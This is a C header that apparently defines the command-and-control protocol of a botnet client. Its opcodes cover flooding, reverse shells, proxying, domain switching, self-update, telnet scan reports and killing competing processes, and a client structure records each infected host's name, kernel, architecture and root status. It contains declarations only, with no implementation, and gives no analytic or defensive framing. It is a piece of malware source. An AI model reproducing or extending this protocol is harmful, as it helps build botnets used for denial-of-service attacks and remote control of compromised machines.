#ifndef QV3_PROTO_H
#define QV3_PROTO_H

#include <winsock2.h>
#include <stdint.h>
#include <stddef.h>

/* opcodes */
enum {
    OP_CLIENT_HELLO = 0,
    OP_KEY_HANDOVER = 1,
    OP_VERIFY_HANDOVER = 2,
    OP_IDENTIFICATION = 3,
    OP_KEEPALIVE = 4,
    OP_EXIT = 5,
    OP_FLOOD = 6,
    OP_SYSTEM = 7,
    OP_CHANGE_DOMAIN = 8,
    OP_REVERSE_SHELL = 9,
    OP_PROXY = 10,
    OP_UPDATE = 11,
    OP_REPORT_BANNER = 100,
    OP_REPORT_TELNET = 101,
    OP_REPORT_LOCK = 200,
    OP_REPORT_KILL = 201,
    OP_REPORT_SPEEDTEST = 202
};

#define QV3_HEADER_SIZE   8
#define QV3_MAX_PADDING   128
#define QV3_MIN_PADDING   16
#define QV3_FASTHASH_SEED 0xDEADBEEFu

enum {
    STATE_CLIENT_HELLO = 0,
    STATE_VERIFY_HANDOVER = 1,
    STATE_INFORMATION = 2,
    STATE_CONNECTED = 3
};

typedef struct {
    SOCKET sock;
    uint8_t key[32];
    uint8_t nonce[12];
    int state;
    int encrypted;
    char name[64];
    uint32_t version;
    char hostname[128];
    char cwd[128];
    char kernel[128];
    uint16_t arch;
    uint8_t endian;
    uint8_t has_root;
    uint32_t conn_hash;
} qv3_client;

int qv3_connect(qv3_client *c, const char *host, int port);
int qv3_handshake(qv3_client *c);
void qv3_close(qv3_client *c);
int qv3_read(qv3_client *c, uint8_t *op, uint8_t *buf, size_t *len, size_t cap);
int qv3_write(qv3_client *c, uint8_t op, const uint8_t *payload, size_t len);
int qv3_report_speed(qv3_client *c, double mbps);

#endif
